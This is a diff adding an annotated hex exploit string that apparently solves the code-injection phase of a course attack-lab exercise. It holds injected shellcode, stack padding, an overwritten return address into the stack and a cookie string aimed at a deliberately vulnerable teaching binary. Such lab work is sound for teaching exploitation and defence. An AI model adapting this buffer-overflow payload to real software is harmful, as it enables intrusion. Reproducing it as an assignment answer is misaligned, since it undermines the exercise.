@@ -1,0 +1,13 @@
+/* code to insert. 13 bytes */
+68 42 19 40 00 /* pushq  touch3 addr */
+48 c7 c7 08 a9 67 55 /* mov cookie(string),%rdi */
+c3 /* ret */
+
+/* left buffer in stack. 43 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+/* inserted code address */
+c8 a8 67 55 00 00 00 00
+
+/* cookie string "5268a3b3" */
+35 32 36 38 61 33 62 33 00
